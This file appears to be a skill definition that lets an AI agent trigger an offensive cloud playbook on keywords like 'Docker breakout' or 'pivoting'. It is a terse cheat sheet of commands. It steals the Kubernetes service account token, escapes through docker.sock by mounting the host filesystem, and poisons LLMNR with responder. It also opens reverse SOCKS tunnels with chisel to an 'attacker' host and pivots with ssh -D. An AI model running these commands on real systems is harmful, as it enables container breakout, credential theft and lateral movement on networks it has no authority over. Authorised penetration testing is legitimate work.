---
name: losthex-cloud
description: >-
  Container escape, Kubernetes, network attacks, tunneling/pivoting. Triggers: container escape, Kubernetes pentest, k8s, Docker breakout, cloud audit, tunneling, pivoting, AWS Azure GCP.
---
# LostHex-CLOUD

## Gate

```bash
python "$HOME/.workbuddy-ai/skills/losthex-hack/scripts/gate.py"   # bundled gate = HexStrike health check
```

## Container Escape

```bash
# inside container checks
cat /proc/self/cgroup
capsh --print | grep cap
mount | grep docker
# escape chains — ดู DOCKER_ESCAPE_CHAINS.md
# privileged? -> mount host fs
# docker.sock -> docker -H unix:///host/docker.sock run -v /:/host ...
# CVE-2019-5736 runc, CVE-2024-21626
```

## Kubernetes

```bash
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods -A
kubectl auth can-i --list --as=system:serviceaccount:default:default
# kube-hunter, trivy
```

## Network

```bash
# responder / LLMNR poison
responder -I eth0
# dns rebinding, host header — ดู network-protocol-attacks
```

## Tunneling / Pivoting

```bash
# chisel, ligolo, ssh -D
chisel server -p 8080 --reverse
chisel client attacker:8080 R:socks
ssh -D 1080 user@pivot
# proxychains + nmap through tunnel
```

Ponytail: ตัด multi-hop pivot automation — ceiling = single pivot, upgrade เมื่อมี network map.